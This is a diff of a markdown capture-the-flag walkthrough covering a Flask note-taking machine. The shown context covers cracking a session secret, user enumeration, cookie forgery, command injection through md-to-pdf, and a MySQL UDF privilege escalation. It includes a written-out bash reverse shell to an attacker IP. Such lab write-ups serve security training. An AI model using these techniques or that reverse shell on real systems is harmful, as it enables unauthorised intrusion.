@@ -4,7 +4,7 @@ Gaining Access
 
 As usual, we start with an Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (58) (2).png" alt=""><figcaption></figcaption></figure>
 
 Port 5000 was a HTTP port that was running some notetaking application.&#x20;
 
@@ -16,11 +16,11 @@ The web application allowed us to register or login:
 
 I created a user and logged in. When I proxied the traffic through Burp, we can see that there is a JWT Session Cookie present:
 
-<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (65) (2).png" alt=""><figcaption></figcaption></figure>
 
 When decrypted, we can see that it contains some data:
 
-<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (69) (2).png" alt=""><figcaption></figcaption></figure>
 
 Generally, from other machine experiences, Flask uses JWT cookies to differentiate sessions. So I tried to brute force the secret of this cookie with `flask-unsign` and `rockyou.txt`.&#x20;
 
@@ -34,7 +34,7 @@ I noticed that the website has different responses when we key in an invalid use
 
 I created the `test` user and tried a wrong password, and got the `Invalid Login` warning:
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 If we did this a user that does not exist, it would tell us `Invalid Credentials`.&#x20;
 
@@ -42,11 +42,11 @@ If we did this a user that does not exist, it would tell us `Invalid Credentials
 
 With this boolean condition, we can brute force all possible users within the machine. I used Burp Intruder to do so:
 
-<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49) (2).png" alt=""><figcaption></figcaption></figure>
 
 Then I filtered the results using the `Invalid Login` string.
 
-<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 So `blue` is the user on this machine. We can use the secret we found earlier to create a new cokie and sign in by replacing the cookie:
 
@@ -56,11 +56,11 @@ So `blue` is the user on this machine. We can use the secret we found earlier to
 
 With access to this new user, we can view more hidden notes:
 
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (3).png" alt=""><figcaption></figcaption></figure>
 
 The first one was the most interesting as it revealed some FTP Credentials:
 
-<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Logging into FTP, we can gain access to a password policy PDF.
 
@@ -127,7 +127,7 @@ def export_note_remote():
 
 In specific, it runs `md-to-pdf.js`, which might be an RCE vector here. So, we can create a malicious .md file that has commands within it to allow for code injection.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (68) (2).png" alt=""><figcaption></figcaption></figure>
 
 For this case, we would need to have something to escape the first quote and command, hence we start the payload with `';`. Afterwards, we need to inject some Python code since this is a Python based website. I used a basic Python3 reverse shell.
 
@@ -150,7 +150,7 @@ Additionally, when checking the two backups, I used `diff` to view the differenc
 
 With the MySQL Creds, we can login as root:
 
-<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (60) (2).png" alt=""><figcaption></figcaption></figure>
 
 Because MySQL was running as root on the machine, we could do the `raptor_udf.so` exploit. This exploit basically uses a shared library that runs commands from the SQL plugins library. We can add a custom command that would allow us to gain RCE as the root user.
 
@@ -158,8 +158,8 @@ There are more detailed instructions here:
 
 {% embed url="https://www.exploit-db.com/raw/1518" %}
 
-<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (47) (2).png" alt=""><figcaption></figcaption></figure>
 
 Afterwards, we can just use the `do_system('bash -c "bash -i >& /dev/tcp/10.10.16.12/21 0>&1"');` function we defined to gain a reverse shell on the machine.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (67) (2).png" alt=""><figcaption></figcaption></figure>
